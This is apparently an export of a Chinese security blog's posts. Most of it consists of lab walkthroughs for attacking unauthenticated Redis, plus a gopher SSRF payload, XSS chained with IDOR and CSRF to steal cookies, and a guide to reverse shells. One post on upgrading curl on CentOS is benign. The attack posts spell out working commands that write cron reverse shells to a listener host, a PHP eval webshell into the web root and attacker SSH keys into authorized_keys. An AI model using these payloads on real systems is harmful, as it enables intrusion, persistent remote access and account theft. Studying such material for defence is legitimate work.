使用gopher协议攻击本地redis反弹shell payload：1http://192.168.0.103/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_*3%250d%250a%243%250d%250aset%250d%250a%243%250d%250aaaa%250d%250a%2458%250d%250a%250a%250a*+*+*+*+*+bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.0.109%2F7777+0%3E%261%250a%250a%250a%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2415%250d%250a%2Fvar%2Fspool%2Fcron%250d%250a*4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a*1%250d%250a%244%250d%250asave%250d%250a*1%250d%250a%244%250d%250aquit%250d%250a%250a&amp;submit=get 可以看到成功通过gopher协议攻击了本地的redis服务，向任务计划目录下写了一个反弹shell的cron文件在kali上成功反弹到了shell","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"http://yoursite.com/tags/ssrf/"}]},{"title":"Centos6 更新curl版本","slug":"2018-08-26","date":"2018-08-25T23:53:23.401Z","updated":"2018-08-26T00:14:38.716Z","comments":true,"path":"2018/08/26/2018-08-26/","link":"","permalink":"http://yoursite.com/2018/08/26/2018-08-26/","excerpt":"Centos6 更新curl版本由于自己的Centos6.5 curl版本为7.19.7，版本太低，所以要升级curl的版本，之前自己直接采取了源码安装最新版本的方式去升级，结果导致安装完毕后自己电脑的curl版本和php-curl版本不一致的问题于是自己上网查了好久，终于找到了解决办法，在这里记录一下","text":"Centos6 更新curl版本由于自己的Centos6.5 curl版本为7.19.7，版本太低，所以要升级curl的版本，之前自己直接采取了源码安装最新版本的方式去升级，结果导致安装完毕后自己电脑的curl版本和php-curl版本不一致的问题于是自己上网查了好久，终于找到了解决办法，在这里记录一下 更新Centos6 curl为最新版本在这里使用 city-fan 的更新源来更新。 1.更新 ca-bundle 首先备份一下：1cp /etc/pki/tls/certs/ca-bundle.crt /etc/pki/tls/certs/ca-bundle.crt.bak 更新并替换：1curl http://curl.haxx.se/ca/cacert.pem -o /etc/pki/tls/certs/ca-bundle.crt 2 新增 repo 源 新增 repo：1vim /etc/yum.repos.d/city-fan-for-curl.repo Centos6 编辑为如下:12345[CityFanforCurl]name=City Fan Repobaseurl=http://www.city-fan.org/ftp/contrib/yum-repo/rhel6/x86_64/enabled=0gpgcheck=0 Centos7 编辑为如下：12345[CityFanforCurl]name=City Fan Repobaseurl=http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/enabled=0gpgcheck=0 3.更新curl 1yum update curl --enablerepo=CityFanforCurl -y 4.重启服务 12service php-fpm restartservice httpd restart 这时可以看到版本就一致了","categories":[{"name":"其它","slug":"其它","permalink":"http://yoursite.com/categories/其它/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"centos环境下的redis未授权访问漏洞的几种利用方式","slug":"redis","date":"2018-08-18T17:57:33.854Z","updated":"2018-08-24T16:31:15.188Z","comments":true,"path":"2018/08/19/redis/","link":"","permalink":"http://yoursite.com/2018/08/19/redis/","excerpt":"centos环境下的redis未授权访问漏洞的几种利用方式这篇文章记录一下redis未授权访问漏洞的几种利用方式,包括如何利用redis未授权访问漏洞通过任务计划反弹shell，向网站根目录写webshell以及利用redis未授权访问向服务器写入ssh公钥","text":"centos环境下的redis未授权访问漏洞的几种利用方式这篇文章记录一下redis未授权访问漏洞的几种利用方式,包括如何利用redis未授权访问漏洞通过任务计划反弹shell，向网站根目录写webshell以及利用redis未授权访问向服务器写入ssh公钥 漏洞利用环境靶机：centos6.4:192.168.0.104，开启了redis-server，由于配置不当而存在redis未授权访问 攻击机：kali2.0：192.168.0.101，用来攻击配置不当导致存在redis未授权访问漏洞的centos6.4 修改centos中redis配置文件redis.conf中的几个地方 1.bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库 2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句 只有修改了这两处配置，才能远程连接redis服务并且执行数据库语句 利用redis未授权访问漏洞反弹shell首先在centos上开启redis服务 1./src/redis-server redis.conf 接下来使用kali上的redis-cli去访问redis-server 1./src/redis-cli -h 192.168.0.104 -p 6379 可以看到由于配置不当导致redis未授权访问漏洞，可以直接进入redis的交互式shell 下面通过该redis未授权访问漏洞利用linux任务计划来反弹一个shell到我们的kali上面 1234set aaa \"\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\\n\\n\"config set dir /var/spool/cronconfig set dbfilename rootsave 在redis的交互shell中依次执行完上述命令后，可以看到成功的在centos的任务计划目录/var/spool/cron下创建了一个任务计划文件root，该文件里面的cron将执行每分钟执行一次向kali反弹shell的操作 可以看到我们的kali上已经接收到了centos反弹过来的shell，可以执行命令 利用redis未授权访问写webshell还可以通过redis未授权访问漏洞向网站根目录写一个webshell 1234set aaa \"\\n\\n&lt;?php @eval($_POST['c1imber']);?&gt;\\n\\n\"config set dir /var/www/htmlconfig set dbfilename shell.phpsave 可以看到成功向网站根目录写了一个webshell访问该webshell，php一句话木马被解析 利用redis未授权访问向服务器写入ssh公钥该漏洞的前提需要centos允许使用shh密钥去登陆 接下来首先使用kali在本地生成一对密钥 1ssh-keygen -t rsa 之后将公钥id_rsa.pub写入到一个文件内 1(echo -e \"\\n\\n\";cat id_rsa.pub;echo -e \"\\n\\n\")&gt;key.txt 之后利用redis未授权访问漏洞将公钥写到centos的/root/.ssh/authorized_keys文件中 12345cat /root/.ssh/key.txt | ./src/redis-cli -h 192.168.0.4 -x set aaaredis -h 192.168.0.4 -p 6379config set dir /root/.sshconfig set dbfilename authorized_keyssave 其中-x参数代表读取输入流里的内设置给aaa，也就是之前生成的公钥/root/.ssh/key.txt里面的内容可以看到在centos的/root/.ssh目录下的authorized_keys文件里已经成功写入了我们刚刚生成的公钥由于我们将公钥写入了服务器，我们自己这有私钥，之后就可以使用ssh直接远程登陆了 1ssh 192.168.0.4","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://yoursite.com/categories/漏洞复现/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://yoursite.com/tags/漏洞复现/"}]},{"title":"记一次失败漏洞利用的经历--ubuntu下的redis未授权访问漏洞复现","slug":"2018-08-19","date":"2018-08-18T17:16:18.563Z","updated":"2018-08-24T17:06:41.828Z","comments":true,"path":"2018/08/19/2018-08-19/","link":"","permalink":"http://yoursite.com/2018/08/19/2018-08-19/","excerpt":"记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的解决ubuntu任务计划写shell失败的问题和关于ubuntu和centos cron的一些区别这两篇文章","text":"记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的解决ubuntu任务计划写shell失败的问题和关于ubuntu和centos cron的一些区别这两篇文章 漏洞环境及搭建ubuntu16.04（192.168.0.107）：安装了redis服务的靶机,作为redis-server kali2.0（192.168.0.101）：攻击者机器，同样安装了redis，要使用redis-cli对未授权访问漏洞进行利用 该实验中redis的版本为4.0.8，安装redis方法如下 12345wget http://download.redis.io/releases/redis-4.0.8.tar.gztar –xvf redis-4.0.8.tar.gzcd redis-4.0.8makemake install（加入到用户环境变量/usr/local/bin） ubuntu安装完redis后，还需要修改redis配置文件redis.conf里面的几个地方 1.bind 127.0.0.1前面需要加上注释符，保证远程ip可以访问redis数据库 2.protected-mode要修改为no，否则远程连接数据库的ip执行不了数据库语句 尝试利用linux任务计划文件去反弹shell首先在ubuntu上开启redis服务 12cd redis-4.0.8./src/redis-server redis.conf 由于redis的默认配置会直接导致未授权访问，所以在kali上使用redis-cli去访问ubuntu靶机上的redis服务，这里看到可以直接进入redis的交互式shell 12cd redis-4.0.8./src/redis-cli -h 192.168.0.107 -p 6379 现在尝试结合linux任务计划文件去反弹一个shell到自己的kali上面。 首先简单来说一下linux中的任务计划文件，简单来说，任务计划指的就是使系统定时的去执行一些我们设置的任务，来看一下该文件的格式 1cat /etc/crontab 里面的参数和一些符号含义如下 m:分钟 - 从0到59的整数 h:小时 - 从0到23的整数 dom:天 - 从1到31的整数 (必须是指定月份的有效日期) mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份) dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示) user:指的是执行命令的用户 command: 需要执行的命令 星号(*)表示参数所有可用的值，如果为5个*，就代表每分钟执行一次 符号“/”指定步进设置。“/&lt;interger&gt;”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务 ubuntu下可以利用的cron有以下几个地方 /etc/crontab：该文件里面的任务计划可以直接执行 /etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况 /var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提，就是该任务计划文件的权限必须为600 知道了以上的知识，可以通过redis未授权访问漏洞向ubuntu的/etc/cron.d目录下写任务计划文件去反弹shell,首先在kali上监听端口等待连接，我的思路是这样的，首先向/etc/cron.d下写一个任务计划文件step1，文件内容为* * * * * root ln -s -f bash /bin/sh，首先将ubuntu的cron的shell环境由dash改为bash，这样才可以使用交互式命令，之后再在/etc/cron.d目录下创建一个任务计划文件step2，内容为* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1,也就是使用交互式的bash去反弹shell到kali 1nc -nvlp 7777 接下来在redis-cli命令行输入 12345678set aaa \"\\n\\n\\n\\n* * * * * root ln -s -f bash /bin/sh\\n\\n\\n\\n\"config set dir /etc/cron.dconfig set dbfilename step1saveset bbb \"\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1\\n\\n\\n\\n\"config set dir /etc/cron.dconfig set dbfilename step2save 这里有一个需要注意的地方就是在设置变量的时候，也就是设置任务计划文件里的内容时，\\n这个符号前后分别不能小于2个，否则文件内容里面的任务计划会出现乱码导致命令执行失败，这是其中一个坑,可以看到/etc/cron.d目录下分别成功创建了一个名为step1和step2的任务计划文件 文件内容分别为 但是shell还是反弹失败了，/bin/sh的指向也没有修改成功，通过查看日志可以看到这一次的错误原因是ERROR (Syntax error, this crontab file will be ignored) 这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向/etc/cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据 对于这一次失败的总结和看法对于ubuntu环境下的redis未授权访问漏洞写任务计划反弹shell的利用，自己遇到了很多坑，自己都一一排查解决了，结果最终还是在乱码这个问题上失败了，也可以看出确实ubuntu在某些方面设计的还是要比centos安全的，虽然这次漏洞利用失败了，但是自己也学到了不少，对centos和ubuntu这两个系统的cron的区别以及一些其它的安全机制有了更深的认识，所以，虽然失败，但是这一切都是值得的 补充既然在ubuntu下写任务计划反弹shell这种方法不可行是因为ubuntu cron的原因，那么还是可以尝试其它的一些方式去利用该redis未授权访问漏洞的，比如利用redis写webshell或者向服务器写入ssh公钥去远程登陆，下面来说一下ubuntu环境下的redis未授权访问漏洞的另外两种利用手法 利用redis未授权访问写webshell通过redis未授权访问漏洞向ubuntu的web跟目录下写入一个webshell，然后要知道网站的根目录，在该测试环境下网站的根目录为/var/www/html,在kali的redis-cli的交互式shell下执行 1234set aaa \"\\n\\n\\&lt;?php @eval($_POST['c1imber']);?&gt;\\n\\n\"config set dir /var/www/htmlconfig set dbfilename shell.phpsave 执行成功后可以看到在ubuntu的网站跟目录下成功写入了一个webshell,如果想让php解析，需要安装libapache2-mod-php这个扩展 sudo apt-get install libapache2-mod-php 利用redis未授权访问向远程服务器写入ssh公钥ubuntu想要ssh远程登陆，首先需要安装openssh-server 1apt-get install openssh-server 然后需要ubuntu开放22端口允许ssh远程登陆并且开启密钥登陆，这里要修改ubuntu的openssh-server的配置文件/etc/ssh/sshd_config里的几个地方 其中RhostsRSAAuthentication yes代表允许远程RSA认证登陆，也就是密钥登陆，AuthorizedKeysFile %h/.ssh/authorized_keys代表服务器公钥的存放位置，也是要利用redis未授权访问漏洞写入公钥文件的位置 修改完成后重启ssh服务 1service ssh restart 之后在ubuntu的root目录下新建一个名为.ssh的目录 12cd /rootmkdir .ssh 接下来使用kali在本地生成一对密钥 1ssh-keygen -t rsa 之后将公钥id_rsa.pub写入到一个文件内 1(echo -e \"\\n\\n\";cat id_rsa.pub;echo -e \"\\n\\n\")&gt;key.txt 之后利用redis未授权访问漏洞将公钥写到centos的/root/.ssh/id_rsa文件中，首先 1cat /root/.ssh/key.txt | ./src/redis-cli -h 192.168.0.107 -x set aaa 将刚刚生成的公钥设置给redis里的变量aaa接下来在kali的redis-cli的交互式shell下执行 123config set dir /root/.sshconfig set dbfilename authorized_keyssave 执行完毕后会在ubuntu服务器的/root/.ssh目录下生成一个authorized_keys的公钥文件，利用这个公钥文件就可以远程连接这台ubuntu了 ssh远程连接1ssh 192.168.0.107","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://yoursite.com/categories/漏洞复现/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://yoursite.com/tags/漏洞复现/"}]},{"title":"关于ubuntu和centos cron的一些区别","slug":"2018-08-18","date":"2018-08-18T14:01:54.485Z","updated":"2018-08-18T16:43:52.335Z","comments":true,"path":"2018/08/18/2018-08-18/","link":"","permalink":"http://yoursite.com/2018/08/18/2018-08-18/","excerpt":"关于ubuntu和centos cron的一些区别写这篇文章的目的，源自解决ubuntu任务计划写shell失败的问题这篇文章遗留下来的一个问题：就是在向ubuntu的/var/spool/cron/crontabs目录下创建任务计划文件时，需要修改该文件的权限为600,也就是r------，该任务计划文件才能执行，否则就会报错不能执行，报出(root) INSECURE MODE (mode 0600 expected)这个错误，这个问题当时没有太注意，以为是umask不同的问题。直到今天再次利用ubuntu环境下的redis未授权访问漏洞反弹shell时才发现这样一个问题，就是我们并不能直接利用未授权访问漏洞去修改/var/spool/cron/crontabs目录下我们创建的任务计划文件的权限，所以导致任务计划文件不能执行，于是又研究了一番，偶然发现ubuntu和centos的umask是相同的，都是0022，说明之前自己的想法是错误的，并不是umask不同的问题，而是centos和ubuntu cron的区别，下面就来总结一下其cron的区别","text":"关于ubuntu和centos cron的一些区别写这篇文章的目的，源自解决ubuntu任务计划写shell失败的问题这篇文章遗留下来的一个问题：就是在向ubuntu的/var/spool/cron/crontabs目录下创建任务计划文件时，需要修改该文件的权限为600,也就是r------，该任务计划文件才能执行，否则就会报错不能执行，报出(root) INSECURE MODE (mode 0600 expected)这个错误，这个问题当时没有太注意，以为是umask不同的问题。直到今天再次利用ubuntu环境下的redis未授权访问漏洞反弹shell时才发现这样一个问题，就是我们并不能直接利用未授权访问漏洞去修改/var/spool/cron/crontabs目录下我们创建的任务计划文件的权限，所以导致任务计划文件不能执行，于是又研究了一番，偶然发现ubuntu和centos的umask是相同的，都是0022，说明之前自己的想法是错误的，并不是umask不同的问题，而是centos和ubuntu cron的区别，下面就来总结一下其cron的区别 简单来说 ubuntu任务计划有一个目录是/var/spool/cron/crontabs，不过这个目录下的文件权限必须为600任务计划才能执行，这个是和centos的一个区别，但是如果利用redis漏洞的话，不可能直接去修改文件权限为600，而且如果写到/etc/crontab这个文件里的话，会覆盖掉之前的任务计划，所以如果服务器是ubuntu的话，可以写到/etc/cron.d这个任务计划目录下，这个目录下没有要求文件权限是600，并不会报错 下面来总结一下ubuntu和centos的cron ubuntu的cron /etc/crontab：该文件中的任务计划写入就能直接执行 /etc/cron.d：该目录下的文件为任务计划文件，只要文件内容格式符合cron的格式，就会执行 /var/spool/cron/crontabs：该目录下的文件为任务计划文件，不过只有当任务计划文件的权限为600这个权限时任务计划才能执行，否则会报出(root) INSECURE MODE (mode 0600 expected)这个问题 centos的cron /etc/crontab：该文件中的任务计划写入就能直接执行 /etc/cron.d：该目录下的文件为任务计划文件，只要文件内容格式符合cron的格式，就会执行 以上两点和ubuntu的cron没什么区别，唯一的区别是，centos的任务计划文件目录为/var/spool/cron这个目录，而且该目录下的任务计划文件并没有要求权限为600才能执行，这就是ubuntu和centos cron的一个区别，同时也是一个比较坑的地方，值得记录一下，以免以后忘记，至于为什么ubuntu和centos会有这样的区别，我认为和任务计划的目录有关系 centos的/var/spool/cron任务计划目录权限 ubuntu的/var/spool/cron/crontabs任务计划目录 可以看到两个任务计划目录的权限是不一样的，这也是ubuntu和centos cron不同的原因。以后再深入去研究","categories":[{"name":"Linux渗透","slug":"Linux渗透","permalink":"http://yoursite.com/categories/Linux渗透/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"解决ubuntu任务计划写shell失败的问题","slug":"2018-08-17","date":"2018-08-17T15:01:14.850Z","updated":"2018-08-18T13:56:47.915Z","comments":true,"path":"2018/08/17/2018-08-17/","link":"","permalink":"http://yoursite.com/2018/08/17/2018-08-17/","excerpt":"解决ubuntu任务计划写shell失败的问题这个问题的由来是因为自己在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题，结果因为这个问题卡了很久，最终在kakaxi和ttgo2两位大佬的指导和帮助下才解决了该问题，将整个问题的解决过程在这里记录一下~","text":"解决ubuntu任务计划写shell失败的问题这个问题的由来是因为自己在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题，结果因为这个问题卡了很久，最终在kakaxi和ttgo2两位大佬的指导和帮助下才解决了该问题，将整个问题的解决过程在这里记录一下~ 环境说明ubuntu16.04桌面版：192.168.0.107，用来任务计划反弹shell的靶机 kali2.0：192.168.0.106，用来接收ubuntu反弹过来的shell 具体过程事情源自于我利用redis未授权访问漏洞在向ubuntu的/var/spool/cron/crontabs目录下创建任务计划文件去反弹shell时，发现shell并不能反弹到自己的kali上 任务计划文件/var/spool/cron/crontabs/root内容如下 1* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1 需要特别注意的一点是这的root文件的权限必须为600，也就是rw-------，否则会出现cron[53948]: (root) INSECURE MODE (mode 0600 expected)的错误，会影响到后面的实验 但是kali却迟迟接收不到反弹过来的shell之前在centos上利用的时候并没有出现这种情况，使用ubuntu的时候居然不行，下面我们就来一步步的排查看看到底是什么原因导致的 首先，咱们先来看一下系统日志 1tail -f /var/log/syslog 通过系统日志可以看到CRON[55318]: (CRON) info (No MTA installed, discarding output)这一条，我们之所以反弹shell失败，和这句话有着很大的关系，百度了一番后得到这句话的大概意思就是我们任务计划里的命令执行如果出现了错误，ubuntu会将这些错误信息去输出到ubuntu系统的邮件服务器，但是由于ubuntu系统默认没有安装邮件服务器，所以才导致了上面的错误 通过了上面的信息，可以推断出我们任务计划中的命令执行出现了某种错误，然后ubuntu处理这种错误方式是将错误信息发送到本地的邮件服务器，但是邮件服务器不存在，那么我们要想办法将错误信息重定向到文件里面去看看究竟是命令的什么地方产生了错误，修改任务计划文件为 1* * * * * '/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1'&gt;/tmp/error.txt 2&gt;&amp;1 1代表标准输出。2代表标准错误输出，也就是命令执行出现的错误，这里将/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1执行的标准错误输出重定向到输出流，也就是/tmp/error.txt这个文件中，而不是邮件服务器，然后再看日志就没有刚刚的错误了 1/bin/sh: 1: /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1: not found 下面可以看到tmp目录下新生成了一个记录错误信息的文件error.txt,内容如下这条错误的意思说/bin/bash没有被找到，通过错误信息还可以明白一件事情，那就是linux里面的cron中command执行的shell环境是/bin/sh，那我们可以再来看一下ubuntu下的/bin/sh文件究极是一个怎么样的文件 1ls -al /bin/sh 可以看到/bin/sh其实是一个软连接文件(l),类似于windows中的快捷方式，只不过在ubuntu中，/bin/sh这个软连接指向了dash，而我们反弹shell使用的shell环境是bash，所以这一点是反弹出错的根本原因 那么之前的centos为什么就能成功，下面来看一下centos里面的/bin/sh的指向可以看到centos中/bin/sh的指向是bash，所以命令执行不会出错 在这里说一下bash和dash的区别，bash是具有交互能力的shell，而dash不具有交互能力，只是具有运行脚本的能力的shell 搞清楚了根本的原因后，来说一下解决的办法，这里有两种解决办法，其中一种解决办法是通过修改ubuntu中/bin/sh的指向，将dash改为bash即可，命令如下 1ln -s -f bash /bin/sh 可以看到此时/bin/sh以及指向了bash，此时将任务计划里的文件修改为之前反弹shell的命令，可以看到不会再报错了，并且shell成功反弹到了kali上 下面来说一下第二种解决办法，首先我们先将/bin/sh的指向改回dash 1ln -s -f dash /bin/sh 下面来说一下第二种方法，就是避免在cron文件里去使用bash这个具有交互能力的shell，我们可以另外的去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用运行这个shell脚本文件即可 shell脚本文件如下，文件名为/tmp/test.sh 12#!/bin/bash/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.107/7777 0&gt;&amp;1 然后为test.sh加上执行权限 1chmod +x /tmp/test.sh 之后任务计划里的内容修改为 1* * * * * /tmp/test.sh 由于现在cron的shell环境为dash，所以具有可以直接运行/tmp/test.sh这个脚本文件的能力，所以执行了test.sh里面这条反弹shell的命令，现在便可以看到kali上成功反弹到了shell 总结这一次真的是踩了很多坑，最终才终于弄明白，通过这次的学习使我对linux的认识更加的深刻了，同时也学到了解决问题的思路和方法，在这里十分感谢kakaxi和ttgo2两位大神的帮助！ 参考链接视频详解（来自kakaxi和ttgo2两位师傅）","categories":[{"name":"Linux渗透","slug":"Linux渗透","permalink":"http://yoursite.com/categories/Linux渗透/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"漏洞挖掘中的脑洞大开---使用漏洞组合拳扩大漏洞危害","slug":"漏洞组合","date":"2018-08-08T04:26:51.455Z","updated":"2018-08-08T05:26:34.621Z","comments":true,"path":"2018/08/08/漏洞组合/","link":"","permalink":"http://yoursite.com/2018/08/08/漏洞组合/","excerpt":"漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害这篇文章给大家分享一下我在漏洞挖掘中对一些漏洞组合拳的利用方法，相信大家在漏洞挖掘中都遇到过这样一个问题，比如我发现了一个存储型xss，但是只是鸡肋的selfxss，只能自己看到才能触发、又或者是单单的csrf、或者没有实质危害的越权漏洞等，就算提交了也只能算低危，如果小伙伴们在漏洞挖掘中遇到了这些问题，那么这篇文章或许可以帮到各位一些，下面我通过我挖掘到的两个利用漏洞组合拳的方式，分享一下如何将低危漏洞变的有价值","text":"漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害这篇文章给大家分享一下我在漏洞挖掘中对一些漏洞组合拳的利用方法，相信大家在漏洞挖掘中都遇到过这样一个问题，比如我发现了一个存储型xss，但是只是鸡肋的selfxss，只能自己看到才能触发、又或者是单单的csrf、或者没有实质危害的越权漏洞等，就算提交了也只能算低危，如果小伙伴们在漏洞挖掘中遇到了这些问题，那么这篇文章或许可以帮到各位一些，下面我通过我挖掘到的两个利用漏洞组合拳的方式，分享一下如何将低危漏洞变的有价值 组合拳一式：selfxss+水平越权漏洞虽然只是一个selfxss，但是结合水平越权添加的话，可以向其他用户个人中心添加xss payload，从而使该目标网站的目标用户去触发该xss漏洞，将js恶意代码在其浏览器执行 举个栗子：用户中心设置信息的地方没有对xss过滤导致存在存储型xss漏洞，尝试新增常用联系人，在详细地址的位置插入xss的payload 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 但是此处有可能只是一个selfxss，如果只是能打到自己的cookie，那么这个存储型xss就会显得很鸡肋。但是这个网站存在一个越权添加个人信息的漏洞，越权的漏洞之前也提交过一次，在添加的时候通过修改user_id可以越权将信息添加到其它用户里，在这里可以利用越权漏洞将xsspayload插入其他用户的个人中心里去扩大这个selfxss的危害,简单来说就是利用越权添加和selfxss的组合拳增加这个selfxss的危害，这样就可以打到其他用户的cookie 还是之前测试越权的两个账号 用户名：格鲁特 用户id：112054 用户名：火箭 用户id：112069 首先在格鲁特的个人中心中添加常用联系人，之前说了在详细地址处存在存储型xss，这里插入加载远程js的xsspayload，同时使用xss平台接收信息 xsspayload： 1&lt;script src=xss平台上的远程脚本&gt;&lt;/script&gt; 之后抓包，数据包里有个参数为user_id，这个参数可控，导致可以越权修改数据包中的user_id,尝试将此条包含xsspayload的信息越权添加到其他用户的个人信息中，如果成功，那么其他用户在登陆后查看时就会触发xss代码加载远程脚本，将用户的cookie打到我们的xss平台上，这里将user_id改为火箭用户的id（112069）可以看到添加成功，但是在当前的账号上看不到刚刚添加的信息 然后使用火箭账号登陆，可以看到包含xsspayload的信息是否已经被越权添加到火箭用户的常用信息中,可以看到火箭用户在登陆后查看联系人信息时我们的xss平台就能接收到火箭用户的cookie接下来将获取到的火箭用户的cookie替换为格鲁特用户的cookie，可以看到成功登陆到了火箭的账号而且user_id只有6位数，是可以遍历的，如果遍历了所有的uid，那么就可以打到所有用户的cookie，所以漏洞的危害还是非常大的，所以通过selfxss+水平越权两个低危漏洞组合就可以变成一个影响严重的高危漏洞 组合拳二式：selfxss+csrfselfxss危害不够，只能自己弹自己？遇到这样的低危漏洞千万不要放过它，结合一下csrf，会有想不到的效果 举个栗子：在个人中心签名处，经过测试发现存在存储型xss，虽然网站将alert替换为了空，但是只替换了一次，所以通过构造payload： 1\" onmouseover=\"alalertert(1) 提交完签名后刷新页面后发现可以弹框但是貌似这个只能自己看到，因为不确定管理员能否看到自己的签名，所以如果只是一个self的存储型xss的话，危害可能并不会那么大 别急，咱们继续往下看，既然是提交签名的话，一定会发送一次http请求的，所以猜测这一点可能存在csrf，经过测试确实是存在的，但是该网站对csrf是有防御的，因为发送请求时带上了referer头，并且服务端对referer头做了检查，经过一番fuzz后发现referer头里面只要有该网站的域名就可以绕过服务端对csrf的限制 于是想到了一个思路，那就是在自己服务器上创建一个名为”该网站域名.html”的页面,这样的话http请求中的referer里面就会有该网站域名，从而可以绕过对csrf的过滤，页面通过ajax发送一次提交签名的请求，参数为我们构造的xss代码，然后诱使已经登陆该网站的用户使用同一浏览器去访问我服务器上的页面，使该用户在不知情的情况下去更改自己的签名，将签名更改为xss的代码，我们就可以通过js去控制他的浏览器了为了看到效果，我们先把签名给改回来 之后模拟受害者使用同一浏览器去访问我服务器的页面可以看到用户在不知情的情况下发送了一次提交签名的请求，完成了这次的跨站请求伪造，然后再看一下个人中心，可以看到xss代码已经成功写入到受害者的个人签名 可以看到通过selfxss+csrf漏洞的组合拳可以产生巨大的危害，比如我们可以通过csrf将盗取用户cookie的xss代码写入到受害者中心，或者控制浏览器跳转任意页面等，不过签名在服务端限制了只能为30个字符，但是如果加载比较短的域名应该还是可以的 总结这是我在漏洞挖掘中遇到的两个比较有意义的组合利用，总之，在漏洞挖掘中，遇到低危漏洞时，不要急着提交，先看看有没有可以扩大其危害的漏洞，可以尝试组合一下，我相信类似的问题或者脑洞还有不少，以后自己遇到了还会去总结。各位师傅们有什么好的思路的话，欢迎补充~~","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://yoursite.com/categories/漏洞挖掘/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://yoursite.com/tags/漏洞挖掘/"}]},{"title":"Linux下几种反弹shell方法的总结与理解","slug":"linuxshell","date":"2018-07-17T03:55:32.487Z","updated":"2018-09-05T02:00:08.772Z","comments":true,"path":"2018/07/17/linuxshell/","link":"","permalink":"http://yoursite.com/2018/07/17/linuxshell/","excerpt":"Linux下几种反弹shell方法的总结与理解之前在网上看到很多师傅们总结的linux反弹shell的一些方法，为了更熟练的去运用这些技术，于是自己花精力查了很多资料去理解这些命令的含义，将研究的成果记录在这里，所谓的反弹shell，指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，下面来介绍分析几种常用的方法","text":"Linux下几种反弹shell方法的总结与理解之前在网上看到很多师傅们总结的linux反弹shell的一些方法，为了更熟练的去运用这些技术，于是自己花精力查了很多资料去理解这些命令的含义，将研究的成果记录在这里，所谓的反弹shell，指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，下面来介绍分析几种常用的方法 实验环境CentOS 6.5：192.168.0.3 kali2.0：192.168.0.4 方法1：反弹shell命令如下： 1bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 首先，使用nc在kali上监听端口 1nc -lvp 